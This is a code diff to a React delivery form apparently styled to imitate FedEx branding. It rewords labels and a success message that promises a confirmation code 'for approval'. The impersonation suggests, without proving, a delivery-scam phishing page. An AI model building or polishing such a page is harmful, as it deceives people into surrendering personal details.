@@ -36,7 +36,7 @@ export default function ContactDeliveryForm() {
 
           setStatusMessage({
             type: 'success',
-            text: "Delivery details received!\nWe'll reach out to you soon",
+            text: "The delivery form has been successfully completed.\nYou will receive a confirmation code within 15minutes for approval.\nThank you.",
           });
 
           formRef.current.reset();
@@ -106,7 +106,7 @@ export default function ContactDeliveryForm() {
               focus:ring-offset-2
             "
           >
-            Continue to Delivery Form
+            Click to continue
           </button>
         </div>
       )}
@@ -149,7 +149,7 @@ export default function ContactDeliveryForm() {
 
             <h2 className="text-4xl font-extrabold mb-3">
               <span className="text-[#4D148C]">Fed</span>
-              <span className="text-[#FF6600]">Ex</span> Delivery Form
+              <span className="text-[#FF6600]">Ex</span> Delivery
             </h2>
 
             <p className="text-sm text-gray-500 text-center">
@@ -501,8 +501,8 @@ export default function ContactDeliveryForm() {
                 "
               >
                 {loading
-                  ? 'Sending Details...'
-                  : 'Submit Form'}
+                  ? 'Processing...'
+                  : 'Submit to process'}
               </button>
 
             </div>
